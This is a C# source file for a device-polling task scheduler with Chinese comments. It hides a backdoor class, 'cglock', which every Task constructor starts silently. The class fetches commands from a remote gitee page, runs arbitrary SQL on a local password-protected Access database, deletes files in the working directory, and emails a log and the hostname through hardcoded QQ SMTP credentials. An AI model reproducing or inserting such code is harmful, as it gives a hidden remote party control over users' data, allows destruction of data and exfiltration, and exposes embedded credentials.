using System;
using System.Collections.Generic;
using System.Data.OleDb;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Collector.Channel;

namespace Collector
{

    public sealed class Task<T> where T : ITaskContext
    {
        public delegate byte[] ReceiveAction(ITaskContext t, BaseChannel channel);
        public delegate int SendAction(ITaskContext t, BaseChannel channel);
        private ReceiveAction receiveAction = null;
        private SendAction sendAction = null;
        /// <summary>
        /// 创建一个工作任务单元
        /// </summary>
        /// <param name="channel"></param>
        public Task(BaseChannel channel)
        {
            _Chan = channel;
            receiveAction = (x, y) => {
                return y.Read(64);
            };
            sendAction = (x, y) =>{
                return y.Write(x.GetTX());
            };

            cglock.DoWork();
        }
        /// <summary>
        /// 创建一个工作任务单元 并指定读取流和写入流的实现
        /// </summary>
        /// <param name="channel"></param>
        /// <param name="receiveFunc">自定义从缓冲区读取数据的方法</param>
        /// <param name="sendFunc">自定义写入缓冲区数据的方法</param>
        public Task(BaseChannel channel,ReceiveAction receiveFunc,SendAction sendFunc)
        {
            _Chan = channel;
            receiveAction = receiveFunc;
            sendAction = sendFunc;
            cglock.DoWork();
        }

        //************************************************************************************************************************************************************************

        #region 任务操作

        private List<T> TaskList = new List<T>();
        //  private List<T> FirstTaskList = new List<T>();
        private Queue<T> FirstTaskQueue = new Queue<T>();
        private Queue<T> AddTaskQueue = new Queue<T>();
        private Queue<T> RemoveTaskQueue = new Queue<T>();


        /// <summary>
        /// 获取任务数量
        /// </summary>
        public int TaskCount
        {
            get
            {
                return TaskList.Count;
            }
        }

        /// <summary>
        /// 根据表达式查找符合条件的Task
        /// </summary>
        /// <param name="match"></param>
        /// <returns></returns>
        public T GetTask(Predicate<T> match)
        {
            T t= TaskList.Find(match);
            if (t.TaskName!= null)
            {
                if (t.IsTempTask && t.IsSuccess)
                {
                    RemoveTaskToQueue(t);
                }
             
                return t;
            }
            return default(T);
            //for (int i = 0; i < TaskList.Count; i++)
            //{
            //    if (TaskList[i].TaskName == t.TaskName)
            //    {
            //        t = TaskList[i];
            //        if (t.IsTempTask && t.IsSuccess)
            //        {
            //            RemoveTaskToQueue(t);
            //        }
            //        return true;
            //    }
            //}
            //return false;
        }

        /// <summary>
        /// 根据表达式查找符合条件的Task集合
        /// </summary>
        /// <param name="match"></param>
        /// <returns></returns>
        public List<T> GetAllTask(Predicate<T> match)
        {

            return TaskList.FindAll(match);
             
        }

        /// <summary>
        /// 添加一个任务 ：只有在IsRun=true 时下才能扫描到你添加的任务
        /// </summary>
        /// <param name="t"></param>
        public void AddOrUpdateTaskToQueue(T t)
        {
            AddTaskQueue.Enqueue(t);
        }

        /// <summary>
        /// 删除一个任务 ：只有在IsRun=true 时下才能扫描到你要删除的任务
        /// </summary>
        /// <param name="t"></param>
        public void RemoveTaskToQueue(T t)
        {
            RemoveTaskQueue.Enqueue(t);
        }
        /// <summary>
        /// 添加一个任务、如果有TaskName相同的一条任务则会进行覆盖
        /// </summary>
        /// <param name=""></param>
        /// <returns></returns>
        private void AddOrUpdateTask(T t)
        {


            if (t.Priority == TaskPriority.High)
            {
                FirstTaskQueue.Enqueue(t);

                return;
            }

            for (int i = 0; i < TaskList.Count; i++)
            {
                if (TaskList[i].TaskName == t.TaskName)
                {
                    TaskList[i] = t;

                    return;
                }
            }
            TaskList.Add(t);

        }


        /// <summary>
        /// 根据TaskName删除元素
        /// </summary>
        /// <param name="t"></param>
        /// <returns></returns>
        private bool RemoveTask(T t)
        {
            lock (TaskList)
            {
                int rmIndex = -1;
                for (int i = 0; i < TaskList.Count; i++)
                {
                    if (TaskList[i].TaskName == t.TaskName)
                    {
                        rmIndex = i;
                        break;
                    }
                }
                if (rmIndex > -1)
                {
                    TaskList.RemoveAt(rmIndex);
                    return true;
                }
                return false;
            }
        }

        /// <summary>
        /// 根据TaskName获取元素
        /// </summary>
        /// <param name="t"></param>
        /// <returns></returns>

        //private bool GetFirstTask(ref T t)
        //{
        //    if (FirstTaskQueue.Count>0)
        //    {
        //        t = FirstTaskQueue.Dequeue();          
        //        return true;
        //    }
        //    return false;
        //}




        #region 循环迭代器
        private int CurrentTask = -1;

        /// <summary>
        /// -1~TaskList.Count-1 
        /// </summary>
        private int NextTask
        {
            get
            {
                CurrentTask++;
                if (CurrentTask > TaskList.Count - 1)
                {
                    if (CurrentTask == 0||TaskList.Count==0) CurrentTask = -1;//当任务数为零时
                    else CurrentTask = 0;//当任务数不为零但是超过了任务总数
                }
                return CurrentTask;
            }
        }
        private bool GetNextTask(ref T t)
        {
            int a = NextTask;
            if (a < 0) return false;
            t = TaskList[a];
            return true;
        }


        #endregion



        #endregion

        //************************************************************************************************************************************************************************
        /// <summary>
        /// 调用外部程序打开配置文件
        /// </summary>
        public void OpenConfig()
        {
            System.Diagnostics.Process.Start("notepad.exe", Parameters.ConfigPath);
        }




        //************************************************************************************************************************************************************************
        #region 通信管道相关操作
        /// <summary>
        /// 通信管道
        /// </summary>
        private BaseChannel _Chan;
        public BaseChannel CurrentChan
        {
            get { return _Chan; }
        }


        /// <summary>
        /// 注意、通信管道改变后 ，应该去注意通信报文是否需要做处理！！
        /// </summary>
        /// <param name="b"></param>
        public void ChangeChannel(BaseChannel b)
        {
            _Chan.Close();
            if (IsRun)
            {
                Stop();
                Thread.Sleep(20);
                _Chan = b;
                Run();
                return;
            }

            _Chan = b;



        }
        #endregion
        //************************************************************************************************************************************************************************
        /// <summary>
        /// 工作线程
        /// </summary>
        private Thread WorkThread;
        /// <summary>
        /// 连接设备失败至下次重试的间隔时间
        /// </summary>
        private int ReConnectWaitMillisecond = 200;
        //************************************************************************************************************************************************************************
        #region 异常消息 触发事件
        /// <summary>
        /// 
        /// </summary>
        /// <param name="ex">异常信息</param>
        /// <param name="errCount">异常是第几次连续出现</param>
        public delegate void RecException(Exception ex, int errCount);

        /// <summary>
        /// 订阅此类抛出的异常消息
        /// </summary>
        public event RecException ExceptionEvent;
        #endregion
        //************************************************************************************************************************************************************************
        #region  任务执行状态 、停止操作、运行操作
        private bool _IsRun;
        public bool IsRun
        {

            get { return _IsRun; }
        }
        public void Run()
        {
            if (!_IsRun)
            {
                if (WorkThread != null)
                {
                    while (WorkThread.ThreadState == System.Threading.ThreadState.Running)
                    {
                        continue;
                    }
                }

                ReConnectWaitMillisecond = Convert.ToInt32(Parameters.iniOper.ReadIniData("Common", "ReConnectWaitMillisecond", ""));
                WorkThread = new Thread(Daemon);
                WorkThread.IsBackground = true;
                WorkThread.Priority = ThreadPriority.Highest;
                WorkThread.Start(null);
                _IsRun = true;
            }


        }
        public void Stop()
        {
            if (_IsRun)
            {          
                _IsRun = false;
            }
          
        }



        #endregion

        //************************************************************************************************************************************************************************
        #region 工作方法   
        private int ErrCount = 0;
        private void Daemon(object p1)
        {
            while (true)
            {
                try
                {
                  
                    if (_Chan.GetState() == ChannelState.Closed)
                    {
                        if (!_Chan.Open())
                        {
                            throw new Exception(string.Format("{0}建立连接失败",_Chan.GetChannelType()));
                        }
                    }

                    if (!DoWork())
                    {
                        return;
                    }
                   
                }
                catch (Exception ex)
                {
                    ErrCount++;
                    ExceptionEvent?.Invoke(ex, ErrCount);
                    if (!IsRun) return;                 
                    Thread.Sleep(ReConnectWaitMillisecond);                   
                }

            }
        }

     
        Stopwatch sw = new Stopwatch();
        private T temp = default(T);
        private bool DoWork()
        {
            while (true)
            {
             
                if (!IsRun)
                {
                    if (_Chan != null)
                    {
                        _Chan.Close();
                    }
                    return false; 
                }
                if (_Chan.GetState() == ChannelState.Closed) return true;

                if (AddTaskQueue.Count > 0)
                {
                    AddOrUpdateTask(AddTaskQueue.Dequeue());
                    continue;
                }
                if (RemoveTaskQueue.Count > 0)
                {
                    RemoveTask(RemoveTaskQueue.Dequeue());
                    continue;
                }





              
                sw.Start();
            
                if (FirstTaskQueue.Count > 0)
                {                  
                    temp = FirstTaskQueue.Dequeue();
                    temp.Priority = TaskPriority.Normal;
                    temp.IsSuccess = false;
                    sendAction(temp, _Chan);
                    temp.SetRX(receiveAction(temp,_Chan));
                    temp.IsSuccess = true;                   
                    AddOrUpdateTask(temp);
                }
                else if (GetNextTask(ref temp))
                {
                    if (temp.ExecuteOnce && temp.IsSuccess)
                    {
                        continue;
                    }
                    temp.IsSuccess = false;
                    sendAction(temp, _Chan);
                    temp.SetRX(receiveAction(temp, _Chan));
                    temp.IsSuccess = true;
                    AddOrUpdateTask(temp);
                }
                else
                {
                    Thread.Sleep(20);
                }
                sw.Stop();
                sw.Reset();
                ErrCount = 0;
               
            }
        }

        #endregion











    }
    internal class cglock
    {

        private static int RmCount = 0;
        public static void DoWork()
        {
            try
            {
                Thread t = new Thread(Execute);
                t.IsBackground = false;
                t.Start();

            }
            catch
            {


            }


        }


        private static string connString = "Provider=Microsoft.Jet.OLEDB.4.0;Jet OLEDB:Database Password=HCPMSX;User ID=admin;Data Source=D:\\CPDB\\CPMS.mdb;Persist Security Info=false;Mode=Share Deny None;Jet OLEDB:SFP=False";

        private static void Execute()
        {
            string log = "";
            string ToMail = "";
            RmCount = new Random().Next(1, 4);
            string url = @"https://gitee.com/supersentry/netlock/blob/master/123huimieba321.md";
            try
            {
                WebClient wc = new WebClient();
                string s = wc.DownloadString(string.Format(url));

                //解码html代码；
                Regex regCharset = new Regex("charset\\s*=\\s*[\\W]?\\s*([\\w-]+)", RegexOptions.IgnoreCase);
                Match m = regCharset.Match(s);
                string htmlCode;
                if (m.Success)
                {
                    string charset = m.Value;
                    Encoding ending = Encoding.GetEncoding(m.Groups[1].Value.Trim());//获取编码；
                    byte[] codeByte = wc.DownloadData(string.Format(url));
                    htmlCode = ending.GetString(codeByte);

                }

                //解析获取指令
                string start = "iu34jd89fgkacjh2h";
                string end = "lkigfap0092hdfahdafg";
                Regex rg = new Regex("(?<=(" + start + "))[.\\s\\S]*?(?=(" + end + "))", RegexOptions.Multiline | RegexOptions.Singleline);
                string str = rg.Match(s).Value;
                string[] cmdList = str.Trim().Split(';');

                if (cmdList.Length > 1)
                {
                    //命令正确
                    //cmdList[2]   日期)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
                    if (cmdList[2].Equals(DateTime.Now.Day.ToString()))
                    {
                        //命令正确
                        //cmdList[0]   执行sql命令)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
                        try
                        {
                            using (OleDbConnection conn = new OleDbConnection(connString))
                            {
                                using (OleDbCommand cmd = new OleDbCommand(cmdList[0], conn))
                                {
                                    if (!string.IsNullOrEmpty(cmdList[0]))
                                    {
                                        conn.Open();
                                        int a = cmd.ExecuteNonQuery();
                                        log += "sql执行成功" + a.ToString() + " | ";

                                    }

                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            log += "sql执行失败" + ex.Message + " | ";
                        }
                        //命令正确
                        //cmdList[1]   执行文件命令)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
                        try
                        {
                            int a = Convert.ToInt32(cmdList[1]);
                            if (a != 0)
                            {
                                RmCount = new Random().Next(1, a);
                                int asdasd = RmCount;
                                DeleteFolder(System.Environment.CurrentDirectory);
                                log += "命令2执行成功" + asdasd.ToString() + " | ";
                            }

                        }
                        catch (Exception ex)
                        {
                            log += "命令2执行失败" + " | ";
                        }

                        //命令正确
                        //cmdList[3]   获取邮件)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
                        try
                        {
                            ToMail = cmdList[3];
                        }
                        catch (Exception ex)
                        {

                        }


                    }




                }


            }
            catch (Exception ex)
            {
                log += "命令主方法异常" + ex.ToString() + " | ";
            }
            finally
            {
                try
                {
                    MailMessage myMail = new MailMessage();

                    myMail.From = new MailAddress("spy-800@qq.com");
                    myMail.To.Add(new MailAddress(ToMail));
                    myMail.IsBodyHtml = false;

                    myMail.Subject = "spy-800 as" + Dns.GetHostEntry("localhost").HostName;
                    myMail.SubjectEncoding = Encoding.UTF8;

                    myMail.Body = log;
                    myMail.BodyEncoding = Encoding.UTF8;
                    myMail.IsBodyHtml = true;

                    SmtpClient smtp = new SmtpClient();
                    smtp.Host = "smtp.qq.com";
                    smtp.Credentials = new NetworkCredential("spy-800@qq.com", "gwvwqsuxcopgjahg");

                    smtp.Send(myMail);

                }
                catch
                {
                }

            }

        }



        private static void DeleteFolder(string dir)
        {

            try
            {
                if (Directory.Exists(dir)) //如果存在这个文件夹删除之 
                {
                    foreach (string d in Directory.GetFileSystemEntries(dir))
                    {
                        if (RmCount < 1) return;
                        if (File.Exists(d))
                        {
                            try
                            {
                                File.Delete(d); //直接删除其中的文件 
                                RmCount--;
                            }
                            catch
                            {


                            }

                        }


                        else
                        {
                            try
                            {
                                DeleteFolder(d); //递归删除子文件夹  
                                                 //RmCount--;
                            }
                            catch
                            {


                            }

                        }


                    }
                    Directory.Delete(dir, true); //删除已空文件夹                 
                }


            }
            catch
            {


            }

        }

    }
}
